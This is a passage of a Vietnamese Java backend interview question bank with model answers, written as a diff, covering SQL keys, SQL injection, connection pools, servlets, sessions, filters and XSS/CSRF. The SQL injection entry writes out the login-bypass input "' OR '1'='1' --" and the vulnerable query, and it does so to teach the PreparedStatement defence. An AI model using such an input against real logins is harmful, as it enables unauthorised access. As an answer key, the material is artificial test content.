+        "modelAnswer": "1. **Khóa chính (`PRIMARY KEY`)**:\n   - Là một hoặc một nhóm cột dùng để **định danh duy nhất một bản ghi** trong bảng.\n   - Quy tắc bắt buộc: Giá trị phải là duy nhất và **TUYỆT ĐỐI KHÔNG ĐƯỢC CHỨA `NULL`**.\n   - Mỗi bảng chỉ có **duy nhất 1 Primary Key** (mặc định hầu hết RDBMS sẽ tạo một Clustered Index dựa trên khóa này).\n2. **Ràng buộc duy nhất (`UNIQUE KEY`)**:\n   - Đảm bảo dữ liệu trong cột không bị trùng lặp giữa các dòng (ví dụ: `email`, `phone`, `citizen_id`).\n   - Khác biệt với Primary Key: **Cho phép chứa giá trị `NULL`** và một bảng có thể có **nhiều Unique Key** khác nhau (RDBMS sẽ tạo Non-clustered Index cho các cột này).\n3. **Khóa ngoại (`FOREIGN KEY`)**:\n   - Là cột trong một bảng trỏ tới cột Khóa chính (hoặc Unique key) của một bảng khác nhằm thiết lập mối quan hệ giữa hai bảng.\n   - Mục đích: Đảm bảo **Tính toàn vẹn tham chiếu (Referential Integrity)**, ngăn chặn việc chèn mã không tồn tại ở bảng cha và ngăn việc xóa một dòng ở bảng cha khi đang có bảng con tham chiếu đến (trừ khi có cấu hình `ON DELETE CASCADE`).",
+        "seniorTip": "Nêu sự khác biệt thú vị: Trong SQL Server, Unique chỉ cho phép 1 giá trị NULL; nhưng trong MySQL/Postgres cho phép nhiều dòng NULL vì NULL != NULL."
+    },
+    {
+        "id": "audit_28",
+        "domain": "Database & SQL",
+        "question": "SQL Injection là gì? Nêu cơ chế tấn công và cách phòng chống triệt để bằng PreparedStatement trong JDBC?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "SQL Injection (SQLi) là kỹ thuật tấn công chèn các đoạn mã SQL độc hại vào input của người dùng để can thiệp vào câu truy vấn của cơ sở dữ liệu.",
+            "Ví dụ kinh điển: Nhập username là \"' OR '1'='1' --\" làm vô hiệu hóa điều kiện mật khẩu.",
+            "Nguyên nhân: Sử dụng nối chuỗi String concatenation trong Statement thường.",
+            "Giải pháp triệt để: Sử dụng PreparedStatement (Parameterized Queries). PreparedStatement biên dịch trước cây cú pháp (Pre-compiled), input được xử lý thuần túy là dữ liệu (Literal), không thể làm thay đổi cấu trúc câu lệnh."
+        ],
+        "modelAnswer": "1. **Bản chất của SQL Injection**:\n   - Là lỗ hổng bảo mật xếp hạng đầu bảng OWASP. Xảy ra khi lập trình viên ghép nối chuỗi trực tiếp từ dữ liệu người dùng nhập vào câu truy vấn SQL: `String sql = \"SELECT * FROM users WHERE user='\" + inputUser + \"' AND pass='\" + inputPass + \"';\";`\n   - Nếu hacker nhập `inputUser` là `' OR '1'='1' -- `, câu SQL bị biến thành:\n     `SELECT * FROM users WHERE user='' OR '1'='1' -- ...`\n     Vì `'1'='1'` luôn đúng và dấu `--` biến phần kiểm tra password thành chú thích, hacker đăng nhập thành công vào hệ thống mà không cần mật khẩu!\n2. **Cách phòng chống bằng `PreparedStatement`**:\n   - Thay vì nối chuỗi, ta dùng dấu hỏi chấm (`?`): `SELECT * FROM users WHERE user = ? AND pass = ?`\n   - **Cơ chế bảo vệ**: Khi dùng `PreparedStatement`, cơ sở dữ liệu sẽ **biên dịch trước (Pre-compile)** cấu trúc ngữ nghĩa của câu lệnh SQL trước khi đưa tham số vào.\n   - Khi gọi `pstmt.setString(1, inputUser)`, driver DB sẽ đóng gói toàn bộ chuỗi của hacker dưới dạng một **giá trị thuần túy (Data Literal)** và tự động escape các ký tự nguy hiểm. Ký tự `'` hay `OR` của hacker chỉ được hiểu là nội dung tên người dùng, hoàn toàn không thể làm thay đổi cây cú pháp logic của câu lệnh!",
+        "seniorTip": "Nhắc thêm việc ORM như Hibernate/JPA mặc định dùng Parameterized queries nên cũng chống được SQL Injection (trừ khi cố tình nối chuỗi trong HQL/JPQL)."
+    },
+    {
+        "id": "audit_29",
+        "domain": "Database & SQL",
+        "question": "Cơ chế Connection Pool trong Java (HikariCP, Tomcat Pool) hoạt động như thế nào? Tại sao không nên mở kết nối DriverManager.getConnection() mỗi khi có request?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Mỗi lần mở kết nối DB (DriverManager.getConnection) tốn chi phí cực lớn: Bắt tay 3 bước TCP, xác thực tài khoản, cấp phát bộ nhớ socket ở cả client và DB server (tốn hàng trăm ms).",
+            "Connection Pool duy trì sẵn một nhóm các kết nối DB đang hoạt động (Active connections) trong bộ nhớ.",
+            "Khi request cần: mượn connection từ pool -> chạy query -> gọi conn.close() thì connection KHÔNG BỊ HỦY mà chỉ được trả về lại pool.",
+            "HikariCP là connection pool nhanh và phổ biến nhất hiện nay trong Spring Boot."
+        ],
+        "modelAnswer": "1. **Tác hại của việc mở kết nối thủ công (`DriverManager`)**:\n   - Để thiết lập một kết nối mới tới DB, máy chủ phải trải qua quá trình rất nặng nề: Bắt tay 3 bước TCP network, thương lượng mã hóa SSL, xác thực user/password, và DB Server phải cấp phát một process/thread riêng cùng bộ nhớ đệm cho session đó. Quá trình này mất từ 100ms - 500ms.\n   - Nếu trang web có 1000 người truy cập đồng thời mà mỗi người đều mở một kết nối mới, DB Server sẽ cạn kiệt RAM, CPU quá tải và sập toàn bộ hệ thống.\n2. **Cơ chế hoạt động của Connection Pool**:\n   - Connection Pool (như **HikariCP**, **Tomcat JDBC Pool**) là một bộ quản lý bộ nhớ đệm kết nối. Khi ứng dụng khởi động, nó tự động mở sẵn một số lượng kết nối nhất định (ví dụ `minimum-idle = 10`, `maximum-pool-size = 30`) và duy trì chúng sống liên tục.\n   - Khi một luồng người dùng cần truy vấn DB, nó chỉ mất vài micro-giây để **\"mượn\" (borrow)** một kết nối rảnh rỗi từ Pool.\n   - Khi thực thi xong, code gọi phương thức `conn.close()`. Thực chất đối tượng Connection của Pool đã được bọc lại (Proxy pattern): lệnh `.close()` **KHÔNG ĐÓNG KẾT NỐI VẬT LÝ**, mà chỉ đơn thuần dọn dẹp trạng thái và **hoàn trả kết nối trở lại vào Pool** để người khác tái sử dụng ngay lập tức.",
+        "seniorTip": "Nêu tên HikariCP - thư viện mặc định trong Spring Boot nổi tiếng với tốc độ microsecond và byte-code optimization."
+    },
+    {
+        "id": "audit_30",
+        "domain": "Database & SQL",
+        "question": "Stored Procedure và Function trong SQL khác nhau như thế nào? Khi nào nên dùng Stored Procedure thay vì viết code ở tầng Backend Java?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Stored Procedure: Dùng để thực thi chuỗi tác vụ nghiệp vụ, có thể trả về 0, 1 hoặc nhiều giá trị (qua OUT parameter), có thể gọi DDL/DML, quản lý Transaction.",
+            "Function: Thiết kế để tính toán và BẮT BUỘC trả về duy nhất 1 giá trị (hoặc Table), chỉ dùng trong SELECT, không được chứa lệnh INSERT/UPDATE/DELETE gây thay đổi trạng thái DB (Side-effects).",
+            "Ưu điểm Stored Procedure: Giảm tải network traffic (xử lý dữ liệu lớn tại chỗ), tận dụng execution plan cache.",
+            "Nhược điểm: Khó scale out (DB là nút thắt cổ chai), khó debug và version control so với code Java."
+        ],
+        "modelAnswer": "1. **So sánh Stored Procedure và Function trong SQL**:\n   - **Giá trị trả về**: `Function` **bắt buộc phải trả về một giá trị** duy nhất (Scalar value) hoặc một bảng (Table-valued). `Stored Procedure` không bắt buộc trả về giá trị (có thể trả về void, hoặc trả về nhiều kết quả thông qua các tham số `OUT`).\n   - **Cách gọi**: `Function` có thể được gọi nhúng trực tiếp trong các câu lệnh `SELECT`, `WHERE`, `HAVING` (ví dụ `SELECT dbo.calculateAge(dob) FROM User`). `Stored Procedure` phải được gọi độc lập bằng lệnh `EXEC` hoặc `CALL`.\n   - **Thay đổi trạng thái (Side-effects)**: `Function` thường chỉ được đọc dữ liệu (không được phép chạy `INSERT`, `UPDATE`, `DELETE` làm thay đổi dữ liệu của bảng). `Stored Procedure` được toàn quyền chạy mọi lệnh DML, DDL và quản lý cả `COMMIT`/`ROLLBACK` transaction.\n2. **Khi nào nên dùng Stored Procedure thay vì viết code Java**:\n   - Khi cần xử lý **dữ liệu quy mô cực lớn (Batch processing)**: Ví dụ tính toán tổng kết doanh số cuối ngày cho 10 triệu bản ghi. Nếu kéo 10 triệu dòng về tầng Java để tính thì sẽ làm nghẽn băng thông mạng; chạy Stored Procedure sẽ xử lý trực tiếp tại chỗ trên server DB và chỉ trả về một vài con số tổng hợp.\n   - **Bảo mật**: Cho phép gán quyền cho user chỉ được chạy procedure mà không cho phép truy cập trực tiếp vào bảng nhạy cảm.",
+        "seniorTip": "Nhắc thêm về nhược điểm: Logic nằm trong Stored Procedure rất khó viết Unit Test tự động và khó scale theo kiến trúc Microservices."
+    },
+
+    # ==========================================
+    # 4. JAVAWEEB & SERVLET/JSP (31 - 40)
+    # ==========================================
+    {
+        "id": "audit_31",
+        "domain": "JavaWeb",
+        "question": "Trình bày vòng đời (Lifecycle) của Servlet trong Servlet Container (Tomcat)? Servlet là đơn luồng hay đa luồng?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "3 Giai đoạn vòng đời: init() -> service() -> destroy().",
+            "init(ServletConfig config): Chỉ chạy 1 LẦN DUY NHẤT khi Servlet được tải vào bộ nhớ (lúc khởi động server hoặc lúc có request đầu tiên).",
+            "service(request, response): Chạy MỖI KHI có request đến, điều phối sang doGet(), doPost()...",
+            "destroy(): Chạy 1 LẦN DUY NHẤT khi container tắt hoặc reload ứng dụng để giải phóng tài nguyên.",
+            "Servlet là ĐƠN INSTANCE - ĐA LUỒNG (Single Instance - Multi-threaded): 1 đối tượng Servlet duy nhất phục vụ đồng thời hàng ngàn request trên các Thread khác nhau -> Không được dùng instance variable để lưu trạng thái request!"
+        ],
+        "modelAnswer": "1. **Vòng đời của Servlet gồm 3 giai đoạn chính**:\n   - **Nạp và khởi tạo (`init()`)**: Khi có request đầu tiên (hoặc khi khởi động server nếu có thẻ `<load-on-startup>`), Servlet Container (Tomcat) nạp class Servlet, tạo **duy nhất 1 instance** và gọi phương thức `init(ServletConfig config)`. Phương thức này **chỉ chạy 1 lần duy nhất** trong suốt vòng đời để khởi tạo cấu hình, kết nối DB.\n   - **Xử lý yêu cầu (`service()`)**: Mỗi khi có một HTTP request gửi đến URL tương ứng, Container sẽ cấp phát một luồng (**Thread**) mới và gọi phương thức `service(HttpServletRequest, HttpServletResponse)`. Dựa vào phương thức HTTP (GET, POST, PUT), hàm `service()` sẽ điều phối đến các phương thức tương ứng như `doGet()` hoặc `doPost()`.\n   - **Tiêu hủy (`destroy()`)**: Khi Web Container tắt hoặc ứng dụng bị gỡ bỏ (undeploy), phương thức `destroy()` được gọi **1 lần duy nhất** để đóng các kết nối mở, giải phóng tài nguyên. Sau đó instance bị GC thu hồi.\n2. **Servlet là đơn luồng hay đa luồng?**\n   - **Servlet hoạt động theo mô hình: Single Instance - Multi-threaded!**\n   - Tomcat chỉ tạo **duy nhất 1 đối tượng Servlet** cho mỗi URL mapping. Nếu có 100 người dùng bấm gửi form cùng lúc, Tomcat dùng 100 luồng (Thread) khác nhau để cùng truy cập vào phương thức `service()` của duy nhất đối tượng đó.\n   - **Cảnh báo sống còn**: Tuyệt đối **không được khai báo biến instance variable** để lưu trữ thông tin của người dùng trong Servlet, vì các luồng sẽ ghi đè lên nhau gây lỗi sai lệch dữ liệu (Race Condition). Mọi dữ liệu phải để trong biến cục bộ bên trong hàm `doGet/doPost`.",
+        "seniorTip": "Nhấn mạnh yếu tố Thread-Safety của Servlet instance variable - đây là câu hỏi 'bắt bài' ứng viên có kinh nghiệm thực chiến hay không."
+    },
+    {
+        "id": "audit_32",
+        "domain": "JavaWeb",
+        "question": "Phân biệt RequestDispatcher.forward() và HttpServletResponse.sendRedirect()? Khi nào sử dụng phương thức nào?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "forward(): Xảy ra hoàn toàn ở Server-side. Chỉ có 1 request duy nhất. URL trên trình duyệt KHÔNG ĐỔI. Dữ liệu trong request scope được giữ nguyên.",
+            "sendRedirect(): Xảy ra ở Client-side. Trả về mã HTTP 302 cho trình duyệt, trình duyệt tạo REQUEST MỚI (Request thứ 2) tới URL mới. URL trên trình duyệt THAY ĐỔI. Dữ liệu request cũ bị mất.",
+            "forward dùng khi: Chuyển dữ liệu từ Servlet sang trang JSP để hiển thị kết quả.",
+            "sendRedirect dùng khi: Sau khi submit form thành công (mô hình Post-Redirect-Get để tránh F5 gửi lại đơn hàng), hoặc chuyển hướng sang domain ngoài."
+        ],
+        "modelAnswer": "Sự khác biệt cốt lõi giữa `forward()` và `sendRedirect()`:\n1. **Cơ chế hoạt động**:\n   - **`RequestDispatcher.forward()` (Chuyển tiếp tại Server)**: Diễn ra hoàn toàn âm thầm bên trong Web Server. Chỉ có **duy nhất 1 cặp request/response**. Server tự động chuyển giao đối tượng `request` sang một Servlet hoặc JSP khác để xử lý tiếp. Thanh địa chỉ URL trên trình duyệt **hoàn toàn KHÔNG THAY ĐỔI**. Tất cả dữ liệu lưu trong `request.setAttribute()` được giữ nguyên vẹn.\n   - **`HttpServletResponse.sendRedirect()` (Chuyển hướng tại Client)**: Server gửi về cho trình duyệt một mã phản hồi **HTTP 302 (Found)** kèm đường dẫn mới trong header `Location`. Trình duyệt nhận mã này sẽ **tự động phát ra một Request mới hoàn toàn (Request thứ 2)** với phương thức `GET` tới URL mới đó. Thanh địa chỉ URL của người dùng **SẼ THAY ĐỔI**. Toàn bộ dữ liệu của request cũ biến mất.\n2. **Trường hợp sử dụng thực tế**:\n   - Dùng **`forward()`** khi: Servlet xử lý nghiệp vụ xong và muốn chuyển dữ liệu sang trang JSP để render giao diện (Mô hình MVC chuẩn).\n   - Dùng **`sendRedirect()`** khi: Áp dụng mô hình **Post-Redirect-Get (PRG)** sau khi thêm mới đơn hàng thành công, chuyển hướng người dùng sang trang danh sách để ngăn chặn việc người dùng nhấn F5 làm gửi lại form (Double Submit). Hoặc khi chuyển hướng sang một website khác nằm ngoài ứng dụng.",
+        "seniorTip": "Nhắc tới mô hình Post-Redirect-Get (PRG Pattern) sẽ khẳng định bạn hiểu sâu về kiến trúc Web chuẩn mực."
+    },
+    {
+        "id": "audit_33",
+        "domain": "JavaWeb",
+        "question": "Phân biệt 4 tầng phạm vi lưu trữ (Scopes) trong ứng dụng JavaWeb: Page, Request, Session và Application?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Page Scope (pageContext): Chỉ tồn tại trong nội bộ 1 trang JSP duy nhất.",
+            "Request Scope (HttpServletRequest): Tồn tại suốt 1 chu kỳ request-response (bao gồm cả các trang forward tới).",
+            "Session Scope (HttpSession): Tồn tại suốt một phiên làm việc của 1 người dùng cụ thể (từ lúc vào web đến khi tắt trình duyệt/hết timeout).",
+            "Application/ServletContext Scope: Tồn tại suốt vòng đời của ứng dụng, dùng chung cho TẤT CẢ người dùng."
+        ],
+        "modelAnswer": "Trong JavaWeb (Servlet/JSP), có 4 phạm vi lưu trữ dữ liệu (Scopes) với vòng đời tăng dần:\n1. **`Page Scope` (Đại diện bởi `pageContext`)**:\n   - Phạm vi hẹp nhất. Dữ liệu chỉ có giá trị trong nội bộ một trang JSP đang thực thi. Chuyển sang trang khác dữ liệu lập tức biến mất.\n2. **`Request Scope` (Đại diện bởi `HttpServletRequest`)**:\n   - Dữ liệu tồn tại trong suốt một chu kỳ yêu cầu - phản hồi (Request-Response).\n   - Nếu dùng `RequestDispatcher.forward()`, dữ liệu vẫn được chuyển tiếp sang Servlet/JSP tiếp theo. Khi response được trả về client, request scope kết thúc.\n   - Ứng dụng: Chứa thông báo lỗi của form, danh sách sản phẩm tìm kiếm để hiển thị lên view.\n3. **`Session Scope` (Đại diện bởi `HttpSession`)**:\n   - Dữ liệu gắn liền với một phiên làm việc của **một người dùng cụ thể** qua nhiều request khác nhau.\n   - Bắt đầu khi người dùng truy cập web và kết thúc khi người dùng đăng xuất, tắt trình duyệt hoặc session bị timeout (mặc định 30 phút).\n   - Ứng dụng: Giỏ hàng mua sắm (Shopping Cart), thông tin tài khoản đã đăng nhập.\n4. **`Application Scope` (Đại diện bởi `ServletContext`)**:\n   - Phạm vi rộng nhất. Dữ liệu được chia sẻ và có thể truy cập bởi **TẤT CẢ mọi người dùng** trong toàn bộ ứng dụng web.\n   - Tồn tại từ lúc ứng dụng được deploy lên server cho tới khi server tắt.\n   - Ứng dụng: Bộ đếm số người truy cập website, cấu hình chung của hệ thống.",
+        "seniorTip": "Quy tắc vàng: Luôn chọn Scope nhỏ nhất có thể để giải phóng bộ nhớ sớm và tránh xung đột dữ liệu."
+    },
+    {
+        "id": "audit_34",
+        "domain": "JavaWeb",
+        "question": "Session và Cookie khác nhau như thế nào? Trình duyệt và Server phối hợp quản lý Session thông qua JSESSIONID ra sao?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Cookie lưu ở Client (trình duyệt), giới hạn dung lượng ~4KB, có thể bị can thiệp/sửa đổi bởi người dùng.",
+            "Session lưu ở Server, an toàn bảo mật, dung lượng lưu trữ lớn hơn.",
+            "Cơ chế JSESSIONID: Khi request đến lần đầu, Server tạo HttpSession, sinh mã định danh duy nhất JSESSIONID và gửi về cho Client qua Cookie (Set-Cookie: JSESSIONID=...).",
+            "Ở các request tiếp theo, Client tự động gửi Cookie JSESSIONID lên -> Server tìm đúng Session tương ứng."
+        ],
+        "modelAnswer": "1. **So sánh Session và Cookie**:\n   - **Cookie**: Là mẩu tin văn bản nhỏ được lưu trữ trực tiếp trên **Trình duyệt của người dùng (Client-side)**. Bị giới hạn dung lượng (~4KB mỗi cookie) và có thể bị người dùng xem, chỉnh sửa hoặc đánh cắp. Thường dùng lưu sở thích, ghi nhớ tài khoản.\n   - **Session**: Là vùng nhớ lưu trữ trạng thái nằm trên **Máy chủ (Server-side)**. Lưu được mọi kiểu dữ liệu đối tượng, dung lượng linh hoạt và có độ bảo mật cao vì người dùng không thể can thiệp trực tiếp.\n2. **Cơ chế phối hợp thông qua `JSESSIONID` (Rất hay hỏi)**:\n   Vì giao thức HTTP vốn là phi trạng thái (**Stateless** - mỗi request là độc lập), Server nhận diện cùng một người dùng bằng cách:\n   - Khi người dùng gửi request lần đầu tiên và gọi `request.getSession()`, Server tạo ra một đối tượng `HttpSession` trên RAM và sinh ra một chuỗi mã định danh duy nhất gọi là **`JSESSIONID`**.\n   - Server đóng gói mã này vào Header phản hồi HTTP: `Set-Cookie: JSESSIONID=XYZ123; Path=/; HttpOnly`.\n   - Trình duyệt nhận được sẽ lưu `JSESSIONID` vào kho Cookie của nó.\n   - Ở các request tiếp theo, trình duyệt tự động đính kèm Cookie này lên: `Cookie: JSESSIONID=XYZ123`.\n   - Server đọc `JSESSIONID` từ request, đối chiếu vào bảng quản lý Session trên RAM và lấy ra đúng dữ liệu của phiên làm việc tương ứng.",
+        "seniorTip": "Nhắc thêm về cờ 'HttpOnly' để ngăn chặn mã độc JavaScript đọc trộm cookie qua lỗ hổng XSS."
+    },
+    {
+        "id": "audit_35",
+        "domain": "JavaWeb",
+        "question": "Filter trong JavaWeb là gì? Nêu chu trình hoạt động của FilterChain và các ứng dụng thực tế phổ biến?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Filter là thành phần chặn giữa Client và Servlet (Interceptor), có thể can thiệp cả trước khi request tới Servlet và sau khi response rời Servlet.",
+            "FilterChain: Quản lý chuỗi các Filter. Lệnh chain.doFilter(request, response) đẩy yêu cầu sang Filter tiếp theo hoặc sang Servlet đích.",
+            "Nếu không gọi chain.doFilter(), request sẽ bị chặn đứng lại (dùng trong phân quyền/chặn đăng nhập).",
+            "Ứng dụng: Xác thực đăng nhập (Authentication), ép kiểu mã hóa Tiếng Việt (UTF-8 Encoding), ghi log (Logging), nén dữ liệu (Gzip)."
+        ],
+        "modelAnswer": "1. **Khái niệm Filter trong JavaWeb**:\n   - `Filter` là một thành phần có khả năng đánh chặn (**Intercept**) các yêu cầu HTTP trước khi chúng kịp chạm tới Servlet đích, đồng thời cũng có thể can thiệp vào phản hồi HTTP sau khi Servlet xử lý xong trước khi trả về cho Client.\n2. **Cơ chế hoạt động của `FilterChain`**:\n   - Phương thức cốt lõi là `doFilter(ServletRequest request, ServletResponse response, FilterChain chain)`.\n   - Khi một request tới, mã nguồn trước lệnh `chain.doFilter()` sẽ được chạy trước.\n   - Lệnh **`chain.doFilter(request, response)`** đóng vai trò bàn giao quyền điều khiển cho Filter tiếp theo trong chuỗi hoặc bàn giao cho Servlet cuối cùng.\n   - Nếu Filter phát hiện người dùng chưa đăng nhập, nó có thể chủ động chuyển hướng và **KHÔNG GỌI `chain.doFilter()`**, chặn đứng hoàn toàn việc truy cập vào Servlet!\n   - Sau khi Servlet chạy xong, luồng điều khiển quay ngược trở lại các dòng code nằm sau lệnh `chain.doFilter()` để tiếp tục xử lý response.\n3. **Các ứng dụng thực tế phổ biến**:\n   - **Mã hóa ký tự (Character Encoding Filter)**: Ép toàn bộ request về `UTF-8` để chống lỗi font chữ tiếng Việt.\n   - **Xác thực & Phân quyền (Authentication/Authorization Filter)**: Kiểm tra session đăng nhập, nếu chưa đăng nhập thì đẩy về trang Login.\n   - **Ghi nhật ký (Logging Filter)**: Ghi lại địa chỉ IP, URL truy cập và đo thời gian xử lý request.",
+        "seniorTip": "Filter chính là tiền thân của cơ chế HandlerInterceptor và Spring Security Filter Chain trong hệ sinh thái Spring."
+    },
+    {
+        "id": "audit_36",
+        "domain": "JavaWeb",
+        "question": "Trình bày mô hình kiến trúc MVC (Model - View - Controller) trong ứng dụng JavaWeb truyền thống? Nhiệm vụ cụ thể của từng thành phần?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Model: Đại diện cho dữ liệu và logic nghiệp vụ (JavaBeans, POJO, DAO, Service).",
+            "View: Giao diện hiển thị dữ liệu tới người dùng (JSP, HTML, JSTL, EL). Tuyệt đối không chứa logic xử lý DB.",
+            "Controller: Bộ điều phối trung tâm (Servlet). Nhận request, gọi Model xử lý, chọn View và forward dữ liệu sang View.",
+            "Lợi ích: Tách bạch rõ ràng trách nhiệm (Separation of Concerns), dễ bảo trì, nhiều lập trình viên có thể làm việc song song."
+        ],
+        "modelAnswer": "Kiến trúc **Model - View - Controller (MVC Model 2)** trong JavaWeb chia tách ứng dụng thành 3 thành phần độc lập:\n1. **Controller (Thường là các Servlet)**:\n   - Là điểm tiếp nhận đầu tiên của mọi yêu cầu từ người dùng.\n   - Nhiệm vụ: Đọc và parse dữ liệu từ form, kiểm tra tính hợp lệ cơ bản, sau đó gọi các hàm xử lý nghiệp vụ ở tầng Model (Service/DAO). Cuối cùng, Controller đưa dữ liệu kết quả vào `request.setAttribute()` và điều hướng (`forward`) sang trang View thích hợp.\n2. **Model (Bao gồm POJO, Entity, Service, DAO)**:\n   - Trái tim của ứng dụng, chịu trách nhiệm lưu trữ trạng thái dữ liệu và thực hiện các quy tắc tính toán nghiệp vụ (Business Logic).\n   - Tương tác trực tiếp với Database thông qua JDBC hoặc Hibernate để truy vấn và cập nhật dữ liệu.\n3. **View (Thường là các trang JSP / JSTL / Expression Language)**:\n   - Chịu trách nhiệm hiển thị kết quả cho người dùng dưới dạng HTML/CSS.\n   - Quy tắc chuẩn: **View không được phép chứa logic nghiệp vụ hay câu lệnh SQL**. Nó chỉ đọc dữ liệu đã được Controller chuẩn bị sẵn trong các scope để hiển thị lên màn hình.\n4. **Luồng hoạt động tổng thể**:\n   `User -> (HTTP Request) -> Controller (Servlet) -> Gọi Model (Service/DAO) -> Nhận dữ liệu Model -> Forward dữ liệu -> View (JSP) -> (HTML Response) -> User`.",
+        "seniorTip": "Nêu nguyên tắc 'Thin Controller, Fat Model' - Controller chỉ điều phối, không nên viết hàng trăm dòng logic tính toán vào Servlet."
+    },
+    {
+        "id": "audit_37",
+        "domain": "JavaWeb",
+        "question": "Phân biệt phương thức GET và POST trong giao thức HTTP? Khi nào bắt buộc dùng POST?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "GET: Tham số gửi trực tiếp trên thanh URL (Query String), giới hạn độ dài (~2048 ký tự), có thể bookmark và cache được, không bảo mật cho dữ liệu nhạy cảm.",
+            "POST: Dữ liệu gửi ẩn trong HTTP Request Body, không giới hạn dung lượng, không bị lưu trong lịch sử duyệt web, an toàn hơn.",
+            "Tính Idempotent: GET có tính Idempotent (gọi nhiều lần không làm đổi trạng thái server); POST không idempotent (gọi nhiều lần sinh ra nhiều đơn hàng).",
+            "Bắt buộc dùng POST khi: Gửi mật khẩu, dữ liệu nhạy cảm, upload file, hoặc thao tác tạo mới dữ liệu làm thay đổi trạng thái hệ thống."
+        ],
+        "modelAnswer": "1. **Khác biệt cốt lõi giữa GET và POST**:\n   - **Cách truyền dữ liệu**:\n     - `GET`: Toàn bộ tham số được gắn trực tiếp phía sau URL dưới dạng Query String (ví dụ: `search.jsp?keyword=java&page=1`).\n     - `POST`: Dữ liệu được đóng gói ẩn bên trong **Thân yêu cầu (HTTP Request Body)**, không hiển thị trên URL.\n   - **Dung lượng truyền tải**:\n     - `GET`: Bị giới hạn bởi chiều dài tối đa của URL mà trình duyệt và web server hỗ trợ (thường khoảng 2KB - 8KB).\n     - `POST`: Về mặt lý thuyết là **không giới hạn**, chỉ phụ thuộc vào cấu hình tối đa của Web Server (thích hợp tải file, ảnh).\n   - **Tính an toàn và Caching**:\n     - `GET`: Dữ liệu hiển thị lộ trên URL, bị lưu vào lịch sử duyệt web (Browser History), có thể được Cache lại. Tuyệt đối không dùng để gửi mật khẩu, thông tin thẻ tín dụng!\n     - `POST`: Dữ liệu không lưu vào History, không bị trình duyệt tự động cache.\n   - **Tính Idempotency (Tính lũy đẳng)**:\n     - `GET` có tính **Idempotent**: Gọi 1 lần hay 100 lần thì tài nguyên trên server vẫn không thay đổi.\n     - `POST` **không có tính Idempotent**: Mỗi lần bấm gửi là một lần server thực thi hành động (ví dụ bấm submit 2 lần có thể bị trừ tiền 2 lần).\n2. **Khi nào bắt buộc dùng POST**: Khi đăng nhập tài khoản, thanh toán, upload file, và các thao tác thêm mới/sửa đổi dữ liệu vào Database.",
+        "seniorTip": "Lưu ý câu bẫy: POST an toàn hơn GET nhưng không có nghĩa là bảo mật tuyệt đối, vẫn phải kết hợp mã hóa HTTPS để chống bắt gói tin trên đường truyền."
+    },
+    {
+        "id": "audit_38",
+        "domain": "JavaWeb",
+        "question": "Làm thế nào để xử lý Upload file trong Servlet? Thẻ form HTML và Servlet cần cấu hình những gì?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Form HTML: Phải dùng method='POST' và bắt buộc thuộc tính enctype='multipart/form-data'.",
+            "Servlet (từ Servlet 3.0): Bắt buộc đánh dấu annotation @MultipartConfig.",
+            "Lấy file: Sử dụng request.getPart('fieldName') trả về đối tượng Part.",
+            "Lưu file: Dùng part.write(filePath) để lưu file xuống ổ cứng."
+        ],
+        "modelAnswer": "Để xử lý Upload file (ảnh, tài liệu) trong JavaWeb, cần cấu hình đồng bộ ở cả 2 phía:\n1. **Phía Client (Trang HTML/JSP)**:\n   - Thẻ `<form>` **bắt buộc** phải sử dụng phương thức `method=\"POST\"`.\n   - Bắt buộc phải khai báo thuộc tính: **`enctype=\"multipart/form-data\"`** (thay vì giá trị mặc định là `application/x-www-form-urlencoded`). Thuộc tính này báo cho trình duyệt biết cần chia nhỏ file nhị phân thành các khối dữ liệu đa phần (multi-part) để truyền qua mạng.\n   - Dùng input kiểu: `<input type=\"file\" name=\"avatar\" />`.\n2. **Phía Server (Servlet - Chuẩn Servlet 3.0 trở lên)**:\n   - Trên đầu class Servlet, bắt buộc phải khai báo chú thích **`@MultipartConfig`** (có thể cấu hình thêm `maxFileSize`, `maxRequestSize`).\n   - Trong hàm `doPost()`, sử dụng phương thức **`Part filePart = request.getPart(\"avatar\");`** để lấy đối tượng file.\n   - Trích xuất tên file thông qua `filePart.getSubmittedFileName()`.\n   - Gọi phương thức **`filePart.write(savePath + File.separator + fileName);`** để ghi dữ liệu trực tiếp xuống thư mục lưu trữ trên máy chủ.",
+        "seniorTip": "Nhắc thêm việc kiểm tra phần mở rộng (extension) và dung lượng file ở server để chống hacker upload mã độc .jsp hoặc webshell lên server."
+    },
+    {
+        "id": "audit_39",
+        "domain": "JavaWeb",
+        "question": "Tấn công XSS (Cross-Site Scripting) và CSRF (Cross-Site Request Forgery) là gì? Cách phòng chống trong ứng dụng JavaWeb?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "XSS: Hacker chèn mã JavaScript độc hại vào trang web để chạy trên trình duyệt của nạn nhân (đánh cắp cookie session). Phòng chống bằng cách Escape HTML và dùng JSTL <c:out>.",
+            "CSRF: Hacker lừa nạn nhân (đã đăng nhập) click vào link độc hại để bí mật gửi request trái phép dưới danh nghĩa nạn nhân. Phòng chống bằng CSRF Token.",
+            "Cookie HttpOnly giúp giảm thiểu rủi ro XSS đánh cắp JSESSIONID.",
+            "CSRF Token là chuỗi ngẫu nhiên bí mật sinh ra trên server đính kèm vào mỗi form."
+        ],
